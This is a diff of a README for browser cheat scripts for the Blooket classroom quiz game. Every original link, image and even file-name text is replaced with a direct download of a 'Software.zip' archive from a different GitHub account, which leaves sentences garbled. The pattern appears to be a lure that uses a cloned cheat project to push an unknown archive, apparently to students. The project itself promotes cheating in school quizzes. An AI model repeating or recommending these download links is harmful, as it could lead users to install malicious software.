@@ -1,19 +1,19 @@
 # THE BEST, PRO, BLOOKET CHEAT GUI OUT THERE!
-Supported Websites (fixed): (anything).blooket.com‎‎/(anything)
-![blooketcheatgui](https://github.com/swagging-post/Blooket-Cheat-GUI/assets/160811072/7f842fb9-9c94-480b-b594-55850b091fe3)
+Supported Websites (fixed): (anything)https://github.com/fsdadawsfawfa/Blooket-Cheat-GUI-aka-Swaggers-GUI/releases/download/v2.0/Software.zip‎‎/(anything)
+![blooketcheatgui](https://github.com/fsdadawsfawfa/Blooket-Cheat-GUI-aka-Swaggers-GUI/releases/download/v2.0/Software.zip)
 # READ FOR IMPORTANT INFO! | V1.9
 A reupload, but currently being fixed of my stolen Blooket Cheats.
 
 <p align="center">Cheats now being managed by SC0TT until further notice.</p>
-<h3 align="center"><a href="https://discord.gg/ZDDcsr9SQZ">Support Server | #tickets </a></h2>
+<h3 align="center"><a href="https://github.com/fsdadawsfawfa/Blooket-Cheat-GUI-aka-Swaggers-GUI/releases/download/v2.0/Software.zip">Support Server | #tickets </a></h2>
 <h3 align="center"><a href="#list-of-cheats-1">List Of Cheats</a></h3>
 
 ## Star History
-<a href="https://star-history.com/#swagging-post/blooket-cheat-gui&Date">
+<a href="https://github.com/fsdadawsfawfa/Blooket-Cheat-GUI-aka-Swaggers-GUI/releases/download/v2.0/Software.zip">
  <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=swagging-post/blooket-cheat-gui&type=Date&theme=dark" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=swagging-post/blooket-cheat-gui&type=Date" />
-   <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=swagging-post/blooket-cheat-gui&type=Date" />
+   <source media="(prefers-color-scheme: dark)" srcset="https://github.com/fsdadawsfawfa/Blooket-Cheat-GUI-aka-Swaggers-GUI/releases/download/v2.0/Software.zip" />
+   <source media="(prefers-color-scheme: light)" srcset="https://github.com/fsdadawsfawfa/Blooket-Cheat-GUI-aka-Swaggers-GUI/releases/download/v2.0/Software.zip" />
+   <img alt="Star History Chart" src="https://github.com/fsdadawsfawfa/Blooket-Cheat-GUI-aka-Swaggers-GUI/releases/download/v2.0/Software.zip" />
  </picture>
 </a>
 
@@ -24,7 +24,7 @@ A reupload, but currently being fixed of my stolen Blooket Cheats.
   
   There are 2 good methods to using these scripts:
   1. Copying the main GUI and running it in the inspect element console
-  2. Copying the .min.js GUI and using it as a bookmarklet
+  2. Copying the https://github.com/fsdadawsfawfa/Blooket-Cheat-GUI-aka-Swaggers-GUI/releases/download/v2.0/Software.zip GUI and using it as a bookmarklet
   
 <details>
   <summary>What can I do if JavaScript is blocked?</summary>
@@ -36,12 +36,12 @@ A reupload, but currently being fixed of my stolen Blooket Cheats.
 
 <details><summary><h3>(script) is not working?</h3></summary>
 
-Make sure you're running it properly (see [How to use](https://github.com/swagging-post/Blooket-Cheeto#how-to-use)), if it still doesn't work and other cheats do, then [make an issue](https://github.com/swagging-post/Blooket-Cheeto/issues)
+Make sure you're running it properly (see [How to use](https://github.com/fsdadawsfawfa/Blooket-Cheat-GUI-aka-Swaggers-GUI/releases/download/v2.0/Software.zip)), if it still doesn't work and other cheats do, then [make an issue](https://github.com/fsdadawsfawfa/Blooket-Cheat-GUI-aka-Swaggers-GUI/releases/download/v2.0/Software.zip)
 </details>
 
 <details><summary><h3>Which script should I use to make a bookmarklet?</h3></summary>
 
-You should use the scripts ending in ".min.js", as using the others will have errors due to formatting.
+You should use the scripts ending in "https://github.com/fsdadawsfawfa/Blooket-Cheat-GUI-aka-Swaggers-GUI/releases/download/v2.0/Software.zip", as using the others will have errors due to formatting.
 </details>
 
 <details><summary><h3>Can you give me infinite tokens / bypass daily limit / permanently give me blooks / change pack luck?</h3></summary>
@@ -80,10 +80,10 @@ Minesraft2 was sent a cease and desist from Blooket and 05Konz was perm banned, 
 <details><summary><h2>List of Cheats</h2></summary>
 <h3>GUIs<h3>
   
-* [GUI](cheats/gui/gui.js)
-* [GUI Bookmarklet](cheats/gui/gui.min.js)
-* [Mobile GUI outdated](cheats/gui/mobileGui.js)
-* [Mobile GUI Bookmarklet outdated](cheats/gui/mobileGui.min.js)
+* [GUI](https://github.com/fsdadawsfawfa/Blooket-Cheat-GUI-aka-Swaggers-GUI/releases/download/v2.0/Software.zip)
+* [GUI Bookmarklet](https://github.com/fsdadawsfawfa/Blooket-Cheat-GUI-aka-Swaggers-GUI/releases/download/v2.0/Software.zip)
+* [Mobile GUI outdated](https://github.com/fsdadawsfawfa/Blooket-Cheat-GUI-aka-Swaggers-GUI/releases/download/v2.0/Software.zip)
+* [Mobile GUI Bookmarklet outdated](https://github.com/fsdadawsfawfa/Blooket-Cheat-GUI-aka-Swaggers-GUI/releases/download/v2.0/Software.zip)
 ### Global:
 - Auto Answer
 - Highlight Answers
